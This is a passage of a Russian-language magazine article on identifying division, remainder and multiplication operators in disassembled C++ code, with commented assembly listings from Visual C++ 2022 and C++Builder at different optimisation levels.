имеем дело с беззнаковыми целочисленными значениями
                div     ecx
; Частное копируем в переменную var_2C
                mov     [rsp+58h+var_2C], eax
                xor     edx, edx
; Очевидно, далее идет подготовка делимого и делителя
; Делимое: 512
                mov     eax, [rsp+58h+var_a]
; Делитель: 0x100 (256 в десятичной системе)
                mov     ecx, 100h
; Выполняем деление: EAX = EAX / ECX
                div     ecx
; Результат второго деления копируем в регистр EDX, тем самым
готовим параметр перед вызовом оператора <<
                mov     edx, eax
; Выводим строку на экран
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Первое слева число
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(uint)
                lea     rdx, _Val       ; " "
                mov     rcx, rax        ; _Ostr
; «Пробел» — на вывод
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     ecx, [rsp+58h+var_2C]
                mov     edx, ecx
                mov     rcx, rax
; Выводим частное от первого деления — второе слева число
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(uint)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; ...символ перехода на новую строку
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
; Переменную var_b инициализируем числом 0x100 (256 в десятичной
системе счисления)
                mov     [rsp+58h+var_b], 100h
; Значение переменной var_b копируем в регистр EAX
                mov     eax, [rsp+58h+var_b]
; Расширяем EAX до четверного слова — EDX:EAX
                cdq
; Заносим в ECX значение 0xA (10 в десятичной системе)
                mov     ecx, 0Ah
; Осуществляем деление, учитывая знак: EDX:EAX на 0xA, занося
частное в EAX
; EAX = var_b / 0xA
; Судя по инструкции IDIV, имеем дело с целочисленными значениями
со знаком
                idiv    ecx
; Частное помещаем в переменную var_28
                mov     [rsp+58h+var_28], eax
; Готовимся выполнять второе в строке деление (второе справа):
; подготавливаем делимое
                mov     eax, [rsp+58h+var_b]
; расширяем EAX до четверного слова — EDX:EAX
                cdq

Если в регистре EAX было положитель ное значение, в резуль тате выполнения
инструк ции CDQ регистр EDX обну лит ся. Если же в EAX было отрицатель ное зна-
чение, то EDX примет мак сималь ное 32-бит ное значение 0xFFFFFFFF (или -1).
Тем самым EDX есть индикатор знака числа EAX.
   Если делитель пред ставляет собой степень двойки, как в текущем слу чае,
то ком пилятор  избавляется  от DIV/IDIV  для  оптимизации вычислений,
как было сказано ранее. Вторым операн дом следующей далее инструк ции AND
выступает делитель — степень двойки минус 1. После выполнения AND
над этими операн дами, если в EDX был 0x0, это никак не повлияет на него.
Если же там был 0xFFFFFFFF, то операция AND приведет к тому, что в EDX
будет находить ся делитель, что означает: в EAX — отрицатель ное число.
   Дру гими словами, эта операция проводит ся для коррек тного сохранения
знака числа. Как ты мог заметить, она зависит от значения степени двойки
делителя, имен но столь ко млад ших битов будет выделено из EDX. Количество
выделен ных битов влияет на количество позиций для арифметического сдвига
в последу ющей операции. Однако присутствие отрицатель ных чисел не огра-
ничивает ся этой проверкой, для инвертирования значения ком пилятор встав-
ляет инструк цию NEG reg, где это необходимо.


                and     edx, 1Fh
; Складываем знак числа для округления отрицательных значений в
меньшую сторону
                add     eax, edx

Арифметический сдвиг вправо на пять позиций (см. выше: пять выделен ных
                                       5битов) эквивален тен делению числа на 2 = 32.


            sar     eax, 5

Таким образом, последние четыре инструк ции расшифровываются как EAX =
var_b / 32.
  Обрати внимание: даже при вык лючен ном режиме оптимизации ком-
пилятор оптимизировал  деление. И  хотя  прог рамма здорово распухает
от такой оптимизации, этот код выполняет ся нам ного быстрее, чем неоп-
тимизирован ный вариант!


; Готовим результат деления для передачи оператору << в качестве
параметра
                mov     edx, eax
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Выводим первое слева значение
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                lea     rdx, asc_140003304 ; " "
                mov     rcx, rax        ; _Ostr
; Выводим пробел
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     ecx, [rsp+58h+var_28]
                mov     edx, ecx
                mov     rcx, rax
; Выводим второе слева значение
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Выводим символ начала новой строки
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
; Из секции данных только для чтения копируем значение двойной
точности в регистр XMM0
                movsd   xmm0, cs:__real@40b0240000000000
; Затем из регистра в переменную var_d типа double
                movsd   [rsp+58h+var_d], xmm0
                movsd   xmm0, [rsp+58h+var_d]
; Инструкция DIVSD говорит нам о делении вещественных значений
двойной точности
                divsd   xmm0, cs:__real@4072800000000000
; Частное от первого деления сохраняем в локальной переменной
var_18
                movsd   [rsp+58h+var_18], xmm0
; Подготавливаемся ко второму делению: рабочим регистром
выступает XMM1, в него копируется значение переменной var_d...
                movsd   xmm1, [rsp+58h+var_d]
; ...а затем с его участием происходит деление посредством
инструкции DIVSD
                divsd   xmm1, cs:__real@4080000000000000
; Регистр XMM1 выбран неспроста, он использует для передачи
вещественного параметра оператору <<
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Выводим первое слева вещественное число
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                lea     rdx, asc_140003308 ; " "
                mov     rcx, rax        ; _Ostr
; Выводим пробел
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                movsd   xmm0, [rsp+58h+var_18]
                movaps  xmm1, xmm0
                mov     rcx, rax
; Выводим второе слева вещественное число — частное первого
деления
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Выводим std::endl
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
; Последняя пара операций деления
; var_f = cs:__real@42cc0000
                movss   xmm0, cs:__real@42cc0000
                movss   [rsp+58h+var_f], xmm0
                movss   xmm0, [rsp+58h+var_f]
; Инструкция DIVSS намекает на деление вещественных чисел
одинарной точности
                divss   xmm0, cs:__real@41cc0000
                movss   [rsp+58h+var_24], xmm0
; var_24 = var_f / cs:__real@41cc0000
                movss   xmm1, [rsp+58h+var_f]
                divss   xmm1, cs:__real@424c0000
; XMM1 = var_f / cs:__real@424c0000
; Выводим строку
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Первое слева вещественное число
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
                lea     rdx, asc_14000330C ; " "
                mov     rcx, rax        ; _Ostr
; Пробел
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                movss   xmm0, [rsp+58h+var_24]
                movaps  xmm1, xmm0
                mov     rcx, rax
; Второе слева число
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; std::endl
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
                xor     eax, eax
                add     rsp, 58h
                retn
main            endp

Вот такой непростой, но интересный пример получился, наш пигован ный опе-
раторами деления и операн дами разных типов.


Îïòèìèçèðîâàííûé âàðèàíò
А теперь, засучив рукава и глот нув пустырника (или валерь янки), рассмот рим
оптимизирован ный вариант (ключ /Ox) того же примера (demo_divide):


main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
                sub     rsp, 28h
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                mov     edx, 2
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(uint)
                mov     rcx, rax        ; _Ostr
                lea     rdx, _Val       ; " "
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     rcx, rax
                mov     edx, 8
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(uint)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> & (*)(std::basic_ostream<char,std::char_traits<ch
ar>> &))
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                mov     edx, 8
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                mov     rcx, rax        ; _Ostr
                lea     rdx, asc_1400032D4 ; " "
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     rcx, rax
                mov     edx, 19h
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> & (*)(std::basic_ostream<char,std::char_traits<ch
ar>> &))
                movsd   xmm1, cs:__real@4020240000000000
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                mov     rcx, rax        ; _Ostr
                lea     rdx, asc_1400032D8 ; " "
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                movsd   xmm1, cs:__real@402beb3e45306eb4
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> & (*)(std::basic_ostream<char,std::char_traits<ch
ar>> &))
                movss   xmm1, cs:__real@40000000
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
                mov     rcx, rax        ; _Ostr
                lea     rdx, asc_1400032DC ; " "
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                movss   xmm1, cs:__real@40800000
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> & (*)(std::basic_ostream<char,std::char_traits<ch
ar>> &))
                xor     eax, eax
                add     rsp, 28h
                retn
main            endp

Ком ментарии здесь излишни: ком пилятор на этапе тран сляции под считал все
значения и передал их оператору вывода. С дру гими ключами ком пиляции — /
O1, /O2 — ситу ация примерно такая же.


C++ Builder
Как справит ся с оптимизацией деления Embarcadero C++Builder? Рассмот рим
вариант с отключен ной оптимизацией:


                public main


main            proc near                ; DATA XREF:
__acrtused+29↑o
var_50           = qword ptr -50h
var_48           = qword ptr -48h
var_40           = qword ptr -40h
var_38           = qword ptr -38h
var_30           = qword ptr -30h
var_28           = dword ptr -28h
var_24           = dword ptr -24h
var_20           = qword ptr -20h
var_b           = dword ptr -18h
var_a           = dword ptr -14h
var_10           = qword ptr -10h
var_8            = dword ptr -8
var_4            = dword ptr -4
                push    rbp
                sub     rsp, 70h
                lea     rbp, [rsp+70h]
                lea     rax, xmmword_43A598
                mov     [rbp+var_4], 0
                mov     [rbp+var_8], ecx
                mov     [rbp+var_10], rdx
; Инициализируем переменную var_a значением 512 в десятичной
системе
                mov     [rbp+var_a], 200h
; Копируем значение переменной var_a в регистр ECX — делимое для
первой операции
                mov     ecx, [rbp+var_a]
; Выполняем логический сдвиг вправо на восемь позиций, до этого
не додумался даже Visual C++
                shr     ecx, 8
; Результат сдвига записываем в переменную var_28
                mov     [rbp+var_28], ecx
                mov     rcx, rax
; Готовим параметр для вывода
                mov     edx, [rbp+var_28]
; Выводим число
                call    std::ostream::operator<<(uint)
                lea     rdx, unk_42D050
                mov     rcx, rax
; Выводим пробел
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const*)
; Значение переменной var_a копируем в регистр R8D — делимое для
второй операции
                mov     r8d, [rbp+var_a]
; Выполняем логический сдвиг вправо на шесть позиций
                shr     r8d, 6
                mov     rcx, rax
; Результат сдвига готовим для передачи в качестве параметра
                mov     edx, r8d
; Выводим результат
                call    std::ostream::operator<<(uint)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Выводим символ новой строки
                call    std::ostream::operator<<(std::ostream & (*
)(std::ostream &))
                lea     rcx, xmmword_43A598
; В регистр R8D записываем число 32 в десятичной системе
счисления — делитель
                mov     r8d, 20h ; ' '
; Инициализируем переменную var_b
                mov     [rbp+var_b], 100h
; В регистр R9D записываем число 256 в десятичной системе
счисления — делимое
                mov     r9d, [rbp+var_b]
                mov     [rbp+var_30], rax
; Делимое помещаем в EAX
                mov     eax, r9d
; Расширяем EAX до четверного слова — EDX:EAX
                cdq
; Выполняем целочисленное деление с учетом знака, в R8D находится
делитель
                idiv    r8d
; Результат сразу передаем на вывод
                mov     edx, eax
                call    std::ostream::operator<<(int)
                lea     rdx, unk_42D050
                mov     rcx, rax
; Выводим пробел
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const*)
; Место делителя занимает 0xA
                mov     r8d, 0Ah
; В R9D заносим делимое
                mov     r9d, [rbp+var_b]
                mov     [rbp+var_38], rax
; Делимое помещаем в EAX
                mov     eax, r9d
; Расширяем EAX до четверного слова — EDX:EAX
                cdq
; Выполняем целочисленное деление с учетом знака, в R8D находится
делитель
                idiv    r8d
                mov     rcx, [rbp+var_38]
; Результат деления передаем на вывод
                mov     edx, eax
                call    std::ostream::operator<<(int)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Выводим символ начала новой строки
                call    std::ostream::operator<<(std::ostream & (*
)(std::ostream &))
                lea     rcx, xmmword_43A598
; Копируем значения в регистры XMM0 и XMM1 из секции данных
только для чтения
                movsd   xmm0, cs:qword_42D018 ; делитель
                movsd   xmm1, cs:qword_42D020 ; делимое
                movsd   [rbp+var_20], xmm1
                movsd   xmm1, [rbp+var_20]
; Операция деления вещественных значений двойной точности
                divsd   xmm1, xmm0
                mov     [rbp+var_40], rax
; Выводим результат из регистра XMM1
                call    std::ostream::operator<<(double)
                lea     rdx, unk_42D050
                mov     rcx, rax
; Выводим пробел
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const*)
                movsd   xmm0, cs:qword_42D010 ; Новый делитель
                movsd   xmm1, [rbp+var_20] ; Старое делимое
; Операция деления вещественных значений двойной точности
                divsd   xmm1, xmm0
                mov     rcx, rax
; Выводим число
                call    std::ostream::operator<<(double)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Выводим символ новой строки
                call    std::ostream::operator<<(std::ostream & (*
)(std::ostream &))
                lea     rcx, xmmword_43A598
; Последняя пара операций деления вещественных значений одинарной
точности, думаю, не требует дополнительных пояснений, мы уже
достаточно натренировались на делении
                movss   xmm0, cs:dword_42D004
                movss   xmm1, cs:dword_42D008
                movss   [rbp+var_24], xmm1
                movss   xmm1, [rbp+var_24]
                divss   xmm1, xmm0
                mov     [rbp+var_48], rax
                call    std::ostream::operator<<(float)
                lea     rdx, unk_42D050
                mov     rcx, rax
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const*)
                movss   xmm0, cs:dword_42D000
                movss   xmm1, [rbp+var_24]
                divss   xmm1, xmm0
                mov     rcx, rax
                call    std::ostream::operator<<(float)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
                call    std::ostream::operator<<(std::ostream & (*
)(std::ostream &))
                mov     [rbp+var_4], 0
                mov     [rbp+var_50], rax
                mov     eax, [rbp+var_4]
                add     rsp, 70h
                pop     rbp
                retn
main            endp

Сравнивая дизассем блерные листинги прог рамм, построенных без оптимиза-
ции ком пиляторами Visual C++ и C++Builder, можно сказать, что отличились
оба, притом в разных ситу ациях. На первой паре операций деления


unsigned int a = 512;
std::cout << a / 256 << " " << a / 64 << std::endl;

Visual C++ поступил прямолинейно, применив инструк цию DIV в обоих слу чаях.
C++Builder проявил смекалку и вместо деления исполь зовал логический сдвиг
вправо (в первом и втором слу чаях на разное количество позиций, конечно).
  Од нако на второй паре операций нахождения частного


int b = 256;
std::cout << b / 32 << " " << b / 10 << std::endl;

C++Builder бесхитростно восполь зовался инструк цией IDIV в обоих слу чаях.
Тем не менее хотя Visual C++ элемен тарно привел второе слева выражение
b/10 к IDIV, зато над первым b/32 выполнил основатель ную работу по опре-
делению знака числа и арифметическому сдвигу.
  Две последу ющие пары деления веществен ных чисел ничем прин ципиаль-
ным не отличают ся.
   Разбирать построенный C++Builder оптимизирован ный вариант не имеет
никакого смысла, в нем уже все заранее сгенерировано, и ничего интересного
мы там не увидим, разве что множествен ные вет вления.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





          НАХОДИМ МАТЕМАТИЧЕСКИЕ ОПЕРАТОРЫ В
            ДИЗАССЕМБЛИРОВАННЫХ ПРОГРАММАХ





ÈÄÅÍÒÈÔÈÊÀÖÈß ÎÏÅÐÀÒÎÐÀ %
Специаль ной инструк ции для вычисления остатка в наборе команд мик ропро-
цессоров серии 80x86 нет, вместо этого остаток с частным возвращает ся инс-
трук циями деления DIV, IDIV и DIVSx.
                                            N   Если делитель пред ставляет собой степень двойки (2  = b), а делимое —
беззнаковое число, то остаток будет равен N млад шим битам делимого числа.
Если же делимое знаковое, необходимо установить все биты, кроме первых N,
равными знаковому биту для сохранения знака числа. Причем, если N первых
битов равны нулю, все биты резуль тата должны быть сброшены независимо
от значения знакового бита. С подобным приемом мы уже встречались, ког да
разбирали неоптимизирован ный пример, под готовленный Visual C++.
   Таким образом, если делимое — беззнаковое число, то выражение a % 2N
тран слирует ся в конструк цию AND a, N, в противном слу чае тран сляция ста-
новит ся неод нозначна — ком пилятор может  вставлять явную проверку
на равенство нулю с вет влением, а может исполь зовать хит рые математичес-
кие алгорит мы, самый популярный из которых выг лядит так:


DEC x
OR x, -N
INC x

Весь фокус в том, что если первые N битов числа x равны нулю, то все биты
резуль тата, кроме старшего, знакового бита, будут гаран тирован но равны 1,
a OR  x,  –N принудитель но установит в единицу и старший бит, то есть
получит ся значение, равное –1 . В свою очередь, INC –1 даст ноль! Напротив,
если хотя бы один из N млад ших битов равен одному, заимствования из стар-
ших битов не происходит и INC  x возвращает значению первоначаль ный
резуль тат.
  Прод винутые оптимизирующие ком пиляторы могут путем сложных пре-
образований заменять деление рядом дру гих, более быстродейству ющих опе-
раций. К сожалению, алгорит мов для быстрого вычисления остатка для всех
делителей не существу ет и делитель должен быть кратен k  · 2t, где k и t —
целые числа. Тог да остаток можно вычислить по следующей формуле.





Да, эта формула очень сложна, и иден тификация оптимизирован ного операто-
ра % может быть весь ма и весь ма непростой, особен но учитывая патологичес-
кую любовь оптимизаторов к изменению поряд ка команд.
   Рассмот рим пример demo_remainder, который позволит нам разобрать ся
в иден тификации оператора %:


#include <iostream>


int main()
{
    int a = 22;
    std::cout << a % 16 << " " << a % 10 << std::endl;
}



                Резуль тат выполнения demo_remainder

Резуль тат его ком пиляции ком пилятором Microsoft Visual C++ 2022 с отклю-
чен ной оптимизацией должен выг лядеть так:


main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
var_a           = dword ptr -18h
var_14           = dword ptr -14h
; Резервируем память для локальных переменных
                sub     rsp, 38h
; Подготавливаем переменную var_a — делимое
                mov     [rsp+38h+var_a], 16h
; Копируем ее значение в EAX
                mov     eax, [rsp+38h+var_a]
; Расширяем EAX до четверного слова EDX:EAX
                cdq
; Заносим в ECX значение 0xA — делитель
                mov     ecx, 0Ah
; Делим EDX:EAX (var_a) на ECX (0xA)
                idiv    ecx
                mov     eax, edx
; Запоминаем остаток от деления var_a на 0xA в переменной var_14
                mov     [rsp+38h+var_14], eax
; Заносим в EAX значение переменной var_a
                mov     eax, [rsp+38h+var_a]
; Расширяем EAX до четверного слова EDX:EAX
                cdq
; «Вырезаем» знаковый бит числа
                and     edx, 0Fh
; Складываем, чтобы округлить до меньшего
                add     eax, edx
; «Вырезаем» четыре младших бита числа — в них содержится остаток
от деления на 16
                and     eax, 0Fh
; Из остатка вычитаем показатель знака для сохранения знака числа
                sub     eax, edx

Можем подытожить: последние пять инструк ций расшифровываются как EAX =
var_a % 16.
   Готовим резуль тат для вывода, помещая его непосредствен но в требуемый
регистр:


            mov     edx, eax
            mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout


; Выводим первое слева число
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                lea     rdx, _Val       ; " "
                mov     rcx, rax        ; _Ostr
; Выводим пробел
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     ecx, [rsp+38h+var_14]
; Сохраненный ранее результат загружаем из переменной, помещаем в
регистр — готовим к выводу
                mov     edx, ecx
                mov     rcx, rax
; Выводим второе слева число
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Выводим символ новой строки
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> & (*)(std::basic_ostream<char,std::char_traits<ch
ar>> &))
; std::cout << var_a % 16 << " " << var_a % 10 << std::endl;
                xor     eax, eax
                add     rsp, 38h
                retn
main            endp

Любопыт но, что оптимизация не влияет на алгоритм вычисления остатка.
В оптимизирован ном варианте значения под ставлены уже под считан ные. Увы,
ни Visual C++, ни осталь ные известные мне ком пиляторы не умеют вычислять
остаток умножением.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





          НАХОДИМ МАТЕМАТИЧЕСКИЕ ОПЕРАТОРЫ В
            ДИЗАССЕМБЛИРОВАННЫХ ПРОГРАММАХ





ÈÄÅÍÒÈÔÈÊÀÖÈß ÎÏÅÐÀÒÎÐÀ *
В общем слу чае оператор * тран слирует ся либо в машин ную инструк цию MUL
(беззнаковое целочисленное умножение), либо в IMUL (целочисленное умно-
жение со знаком), либо в MULSx (веществен ное умножение в зависимости
от поряд ка точности чисел).
   Если один из множителей кратен степени двойки, то MUL (IMUL) обычно
заменяется коман дой битового сдвига влево SHL или инструк цией LEA, спо-
собной умножать содержимое регистров на 2, 4 и 8. Обе последние коман ды
выполняют ся за один такт, в то время как MUL требует в зависимости от модели
процессора от двух до девяти так тов.
  К тому же LEA за тот же такт успевает сложить резуль тат умножения
с содержимым регистра общего назначения и/или кон стан той в придачу.
Это позволяет умножать на 3, 5 и 9, просто добавляя к умножаемому регистру
его значение. Ну разве это не сказка? Правда, у LEA есть один недочет — она
может вызывать остановку AGI, в конечном счете «съедающую» весь выиг рыш
в быстродействии. Стоит отметить, что проблемой AGI страдали толь ко ран ние
интеловские процессоры, с Pentium Pro они этой «хворью» не болеют. Поэтому
поль зователям современ ных процессоров линейки Core волновать ся об этом
не стоит.
   Рассмот рим пример demo_mul, демонстрирующий иден тификацию опе-
ратора * с операн дами разных типов:


#include <iostream>


int main()
{
    int a = 2;
    std::cout << a * 16 << " " << a * 4 + 5 << " " << a * 13 <<
std::endl;
    double d = 1.5;
    std::cout << d * 3 << " " << d * 5 + a << " " << std::endl;
    float f = 2.2f;
    std::cout << f * 3 << std::endl;
}





                  Резуль тат выполнения demo_mul

Резуль тат его ком пиляции ком пилятором Microsoft Visual C++ 2022 с отклю-
чен ной оптимизацией должен выг лядеть так:


main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
var_a           = dword ptr -28h
var_24           = dword ptr -24h
var_20           = dword ptr -20h
var_1C           = dword ptr -1Ch
var_d           = qword ptr -18h
var_10           = qword ptr -10h
; Резервируем место для локальных переменных
                sub     rsp, 48h
; Переменной var_a присваиваем значение 2
                mov     [rsp+48h+var_a], 2
; Умножаем var_a на 0xD, записывая результат в EAX
                imul    eax, [rsp+48h+var_a], 0Dh
; Перекладываем произведение из EAX в переменную var_20
                mov     [rsp+48h+var_20], eax
; Загружаем в ECX значение var_a
                mov     ecx, [rsp+48h+var_a]
; Умножаем RCX на 4 и добавляем к произведению 5, записывая
результат в регистр ECX. И все это выполняется за один такт!
                lea     ecx, ds:5[rcx*4]
; Копируем результат выражения var_a * 4 + 5 в переменную var_24
                mov     [rsp+48h+var_24], ecx

IMUL с тремя операн дами выполняет умножение второго на третий, сохраняя
резуль тат в первый. Таким образом, var_a умножаем на 0x10... Постой, а где
же обещан ный сдвиг влево в слу чае, ког да один из операн дов пред ставляет
степень двойки? Похоже, ком пилятор решил, что в текущих условиях от замены
оператора не будет существен ного выиг рыша.


              imul    edx, [rsp+48h+var_a], 10h
; Готовим строку для вывода результатов выражений
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                lea     rdx, _Val       ; " "
                mov     rcx, rax        ; _Ostr
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     ecx, [rsp+48h+var_24]
                mov     edx, ecx
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                lea     rdx, asc_140003300 ; " "
                mov     rcx, rax        ; _Ostr
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     ecx, [rsp+48h+var_20]
                mov     edx, ecx
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
; Загрузка вещественного значения двойной точности из секции
данных только для чтения в регистр XMM0
                movsd   xmm0, cs:__real@3ff8000000000000
; Сохранение этого значения в переменную var_d
                movsd   [rsp+48h+var_d], xmm0
                movsd   xmm0, [rsp+48h+var_d]
; Умножение var_d на другое число, загруженное из секции данных
только для чтения
                mulsd   xmm0, cs:__real@4014000000000000
; Преобразование знакового целого числа — var_a, занимающего два
слова, в вещественное значение двойной точности
                cvtsi2sd xmm1, [rsp+48h+var_a]
; Прибавление var_a к var_d с учетом разрядов и вещественности
                addsd   xmm0, xmm1
; Сохранение результата выражения var_d * 5 + var_a во временную
переменную var_10
                movsd   [rsp+48h+var_10], xmm0
                movsd   xmm1, [rsp+48h+var_d]
; Умножение var_d на вещественное значение двойной точности,
загруженное из сегмента данных только для чтения
                mulsd   xmm1, cs:__real@4008000000000000
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Выводим строку, содержащую результаты приведенных выше выражений
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                lea     rdx, asc_14000330C ; " "
                mov     rcx, rax        ; _Ostr
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                movsd   xmm0, [rsp+48h+var_10]
                movaps  xmm1, xmm0
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                lea     rdx, asc_140003308 ; " "
                mov     rcx, rax        ; _Ostr
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
; Загружаем вещественное значение одинарной точности из сегмента
данных
                movss   xmm0, cs:__real@400ccccd
                movss   [rsp+48h+var_1C], xmm0
                movss   xmm0, [rsp+48h+var_1C]
